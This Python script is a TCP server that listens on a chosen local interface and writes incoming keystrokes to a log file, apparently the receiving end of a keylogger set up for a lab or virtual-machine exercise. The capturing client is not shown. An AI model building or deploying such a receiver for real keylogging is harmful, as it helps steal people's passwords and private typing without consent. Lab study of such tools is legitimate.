import socket

# Use your desired interface IP address. Here are the options:
# 1. '127.0.0.1' for loopback (localhost)
# 2. '10.0.2.15' for the IP address of eth0 (local network)
# 3. '172.17.0.1' for the docker0 network (if using Docker)

server_ip = '10.0.2.15'  # Change this to either '127.0.0.1', '10.0.2.15', or '172.17.0.1'
server_port = 12345       # The port on which the server listens

# Log file to save received keystrokes
log_file = "server_keylog.txt"

# Function to handle incoming connections and log keystrokes
def handle_client_connection(client_socket):
    with client_socket:
        while True:
            data = client_socket.recv(1024)  # Receive data from the client
            if not data:
                break  # Exit if no data is received
            keystroke = data.decode('utf-8')
            print(f"Received: {keystroke}")  # Print keystrokes in the terminal

            # Log the keystrokes to a file
            with open(log_file, "a") as f:
                f.write(keystroke)

# Set up the server to listen for incoming connections
def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((server_ip, server_port))  # Bind to the specified IP and port
        server_socket.listen(5)  # Allow up to 5 pending connections
        print(f"Server listening on {server_ip}:{server_port}")

        while True:
            try:
                client_socket, client_address = server_socket.accept()  # Accept incoming connection
                print(f"Connection from {client_address}")
                handle_client_connection(client_socket)  # Handle the client connection
            except Exception as e:
                print(f"Error handling client: {e}")

if __name__ == '__main__':
    start_server()
